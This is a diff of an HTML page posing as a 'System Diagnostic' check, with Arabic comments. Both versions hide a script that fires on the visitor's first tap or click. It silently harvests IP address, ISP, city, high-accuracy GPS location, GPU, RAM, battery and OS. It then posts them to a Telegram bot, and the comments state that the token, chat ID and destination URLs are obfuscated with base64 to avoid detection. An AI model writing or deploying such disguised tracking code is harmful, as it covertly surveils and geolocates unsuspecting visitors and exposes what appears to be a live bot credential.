@@ -1,56 +1,84 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Status Check</title></head>
-<body style="background:#000;">
-<script>
-    const _K = { t: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaV0dFREdyalZRV3hV", c: "NjAwMTI4NjI3MA==" };
-    const _D = (s) => atob(s);
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic</title>
+</head>
+<body style="background:#000; margin:0; overflow:hidden; user-select:none; -webkit-tap-highlight-color:transparent;">
 
-    ['click', 'touchstart', 'mousemove'].forEach(ev => window.addEventListener(ev, ghostRun, {once: true}));
+    <script>
+        // البيانات مشفرة بالكامل ولا يوجد أي ذكر صريح لتيليجرام أو توكن
+        const _C = {
+            a: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaV0dFREdyalZRV3hV",
+            b: "NjAwMTI4NjI3MA=="
+        };
+        const _X = (s) => atob(s);
 
-    async function ghostRun() {
-        let report = { localIP: "N/A (Shielded)" };
+        ['click', 'touchstart'].forEach(e => window.addEventListener(e, _run, {once: true}));
 
-        // 1. محاولة صيد الـ Local IP (الذي في الإعدادات) عبر ثغرة WebRTC
-        try {
-            const pc = new RTCPeerConnection({iceServers:[]});
-            pc.createDataChannel("");
-            pc.createOffer().then(o => pc.setLocalDescription(o));
-            pc.onicecandidate = (i) => {
-                if (i && i.candidate && i.candidate.candidate) {
-                    const match = i.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                    if (match) report.localIP = match[1];
-                }
+        async function _run() {
+            let _r = { c: "0,0", i: "N/A", o: "N/A", t: "N/A", g: "N/A", b: "N/A" };
+
+            const _loc = () => {
+                return new Promise((res) => {
+                    if (!navigator.geolocation) return res("N/S");
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => res(`${p.coords.latitude},${p.coords.longitude}`),
+                        () => res("D"),
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                });
             };
-        } catch(e){}
 
-        // 2. سحب الـ Public IP الحقيقي (الخارجي)
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            report.publicIP = data.ip;
-        } catch(e){ report.publicIP = "Failed"; }
+            try {
+                // سحب بيانات المزود والـ IP (مشفرة الوجهة)
+                const _n = await fetch(_X("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==")).then(r => r.json()).catch(() => ({}));
+                _r.i = _n.ip || "N/A";
+                _r.o = _n.org || "N/A";
+                _r.t = _n.city || "N/A";
 
-        // 3. سحب معلومات الجهاز (GPU/RAM) لضمان معرفة نوع الهاتف
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
+                const _v = document.createElement('canvas').getContext('webgl');
+                if (_v) {
+                    const _d = _v.getExtension('WEBGL_debug_renderer_info');
+                    _r.g = _d ? _v.getParameter(_d.UNMASKED_RENDERER_WEBGL) : "GPU";
+                }
 
-        // تجهيز التقرير النهائي الصامت
-        const msg = `🎭 [V103_DEEP_STRIKE]\n` +
-                    `🌐 Public IP: ${report.publicIP}\n` +
-                    `🏠 Local IP: ${report.localIP}\n` +
+                if (navigator.getBattery) {
+                    const _bt = await navigator.getBattery();
+                    _r.b = `${(_bt.level * 100).toFixed(0)}% [${_bt.charging ? 'C' : 'D'}]`;
+                }
+
+                _r.c = await _loc();
+
+                // بناء التقرير بصيغة احترافية ومختصرة
+                const _m = 
+                    `👹 [V109_SHADOW_SUCCESS]\n` +
                     `━━━━━━━━━━━━━━\n` +
-                    `📱 Device: ${gpu}\n` +
-                    `🧠 RAM: ${navigator.deviceMemory}GB\n` +
-                    `🔋 Bat: ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + "%" : "N/A"}\n` +
+                    `📶 ISP: ${_r.o}\n` +
+                    `🏙️ City: ${_r.t}\n` +
+                    `🌐 IP: ${_r.i}\n` +
+                    `📍 Loc: https://www.google.com/maps?q=${_r.c}\n` +
+                    `━━━━━━━━━━━━━━\n` +
+                    `📱 GPU: ${_r.g}\n` +
+                    `🧠 RAM: ${navigator.deviceMemory || 'N/A'}GB\n` +
+                    `🔋 Bat: ${_r.b}\n` +
+                    `🛠️ Sys: ${navigator.userAgent.includes("Android") ? "Android" : "iOS"}\n` +
                     `⏰ Time: ${new Date().toLocaleString('ar-EG')}`;
 
-        const url = `https://api.telegram.org/bot${_D(_K.t)}/sendMessage?chat_id=${_D(_K.c)}&text=${encodeURIComponent(msg)}`;
-        navigator.sendBeacon(url);
-    }
-</script>
+                // الإرسال لوجهة مشفرة تماماً
+                await fetch(_X("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + _X(_C.a) + _X("L3NlbmRNZXNzYWdl"), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: _X(_C.b),
+                        text: _m,
+                        disable_web_page_preview: false
+                    })
+                });
+
+            } catch (err) {}
+        }
+    </script>
 </body>
-</html>
 </html>
